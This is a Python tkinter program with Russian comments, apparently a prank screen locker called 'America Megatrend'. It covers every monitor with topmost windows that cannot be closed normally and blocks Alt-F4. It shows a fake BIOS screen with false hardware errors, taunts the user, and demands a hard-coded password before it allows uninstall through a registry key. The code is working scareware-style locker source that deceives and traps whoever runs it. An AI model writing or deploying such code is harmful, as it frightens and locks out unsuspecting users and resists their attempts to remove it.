import tkinter as tk
import winreg
import sys
import random
from screeninfo import get_monitors

#настройки
APP_NAME = "America Megatrend"
UNINSTALL_PASSWORD = "5225"
REG_PATH = r"Software\AmericaMegatrend"
REG_NAME = "AllowUninstall"
EXIT_HOTKEY = "<Control-=>"

# --- настройки анимации ---
MATRIX_CHARS = "01АМИBIOS<>#$%&*+=?ABCDEF0123456789"
GLITCH_COLORS = ["red", "#ff3333", "#ff6600", "#ffcc00", "#ff0044", "#cc0000"]
FRAME_DELAY = 60  # мс между кадрами
POST_LINES = [
    "American Megatrends BIOS (C) 1985-2026",
    "Detecting IDE drives ... FAIL",
    "CPU: Unknown @ 0.00 GHz",
    "Memory Test : ERROR",
    "Keyboard ..... LOCKED",
    "Loading MEGATREND.SYS ...",
    "Access denied. Enter password.",
    "System halted. Ha-ha.",
]


def block_event(event):
    return "break"


def normal_exit(event=None):
    for w in windows:
        w.destroy()
    sys.exit(0)


def allow_uninstall():
    password = entry_password.get()

    if password != UNINSTALL_PASSWORD:
        label_status.config(
            text="Неверный пароль",
            fg="red"
        )
        entry_password.delete(0, tk.END)
        return
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        winreg.SetValueEx(key, REG_NAME, 0, winreg.REG_SZ, "1")
        winreg.CloseKey(key)

        label_status.config(
            text="Удаление разрешено.",
            fg="lime"
        )
        button_uninstall.config(state="disabled")
        entry_password.config(state="disabled")

    except Exception as e:
        label_status.config(
            text=f"Ошибка записи в реестр:\n{e}",
            fg="red"
        )


class ScreenAnimator:
    """Живой глючащий BIOS/POST-экран поверх окна."""

    def __init__(self, win, canvas, width, height):
        self.win = win
        self.canvas = canvas
        self.width = width
        self.height = height
        self.font_size = 16
        self.col_w = self.font_size
        self.cols = max(1, width // self.col_w)
        # у каждой колонки matrix-дождя своя стартовая высота и скорость
        self.drops = [random.randint(-height, 0) for _ in range(self.cols)]
        self.speeds = [random.randint(self.font_size, self.font_size * 3)
                       for _ in range(self.cols)]
        self.post_index = 0
        self.tick = 0

    def step(self):
        c = self.canvas
        c.delete("fx")

        # matrix-дождь
        for i in range(self.cols):
            x = i * self.col_w
            y = self.drops[i]
            ch = random.choice(MATRIX_CHARS)
            c.create_text(
                x, y, text=ch, fill="#004400", anchor="nw",
                font=("Courier", self.font_size), tags="fx"
            )
            # яркая «голова» капли
            c.create_text(
                x, y, text=random.choice(MATRIX_CHARS), fill="#00ff66",
                anchor="nw", font=("Courier", self.font_size), tags="fx"
            )
            self.drops[i] += self.speeds[i]
            if self.drops[i] > self.height + random.randint(0, self.height):
                self.drops[i] = random.randint(-self.height, 0)

        # бегущий фейковый POST-лог (левый верхний угол)
        visible = 6
        for n in range(visible):
            idx = (self.post_index + n) % len(POST_LINES)
            c.create_text(
                12, 12 + n * (self.font_size + 4),
                text=POST_LINES[idx], fill="#33ff33", anchor="nw",
                font=("Courier", self.font_size - 2), tags="fx"
            )
        self.tick += 1
        if self.tick % 8 == 0:
            self.post_index = (self.post_index + 1) % len(POST_LINES)

        # глючащий заголовок по центру: дрожание + смена цвета
        jitter_x = random.randint(-4, 4)
        jitter_y = random.randint(-3, 3)
        c.create_text(
            self.width // 2 + jitter_x, self.height // 2 + jitter_y,
            text="AMERICA MEGATREND",
            fill=random.choice(GLITCH_COLORS),
            font=("Arial", 40, "bold"), tags="fx"
        )
        # «тень»-двойник для эффекта glitch
        if random.random() < 0.5:
            c.create_text(
                self.width // 2 + jitter_x + random.randint(-8, 8),
                self.height // 2 + jitter_y,
                text="AMERICA MEGATREND",
                fill="#00ffff", font=("Arial", 40, "bold"), tags="fx"
            )

        c.tag_lower("fx")  # держим интерактивные виджеты поверх анимации
        self.win.after(FRAME_DELAY, self.step)


windows = []
animators = []
monitors = get_monitors()
for i, m in enumerate(monitors):
    win = tk.Tk() if i == 0 else tk.Toplevel()
    win.overrideredirect(True)
    win.attributes("-topmost", True)

    win.geometry(f"{m.width}x{m.height}+{m.x}+{m.y}")
    win.bind("<Alt-F4>", block_event)
    win.bind(EXIT_HOTKEY, normal_exit)
    win.protocol("WM_DELETE_WINDOW", lambda: None)

    canvas = tk.Canvas(
        win, width=m.width, height=m.height,
        bg="black", highlightthickness=0
    )
    canvas.pack(expand=True, fill="both")

    animator = ScreenAnimator(win, canvas, m.width, m.height)
    windows.append(win)
    animators.append((canvas, animator))

main = windows[0]
main_canvas = animators[0][0]

# --- интерактивные виджеты поверх анимации на главном мониторе ---
panel = tk.Frame(main_canvas, bg="black")

label_info = tk.Label(
    panel,
    text="Для удаления программы введите пароль",
    fg="white",
    bg="black",
    font=("Arial", 20)
)
label_info.pack(pady=20)

entry_password = tk.Entry(
    panel,
    font=("Arial", 20),
    show="*",
    width=20,
    justify="center"
)
entry_password.pack(pady=10)

button_uninstall = tk.Button(
    panel,
    text="Подтвердить удаление",
    command=allow_uninstall,
    font=("Arial", 18),
    bg="#aa0000",
    fg="white",
    padx=20,
    pady=10
)
button_uninstall.pack(pady=20)

label_status = tk.Label(
    panel,
    text="",
    fg="white",
    bg="black",
    font=("Arial", 16)
)
label_status.pack(pady=20)

label_hint = tk.Label(
    panel,
    text="сосал?",
    fg="gray",
    bg="black",
    font=("Arial", 12)
)
label_hint.pack(pady=20)

# панель ниже центра, чтобы не перекрывать глючащий заголовок
monitors_main = monitors[0]
main_canvas.create_window(
    monitors_main.width // 2,
    int(monitors_main.height * 0.72),
    window=panel
)

# запускаем анимацию на всех мониторах
for canvas, animator in animators:
    animator.step()

main.grab_set()
main.mainloop()
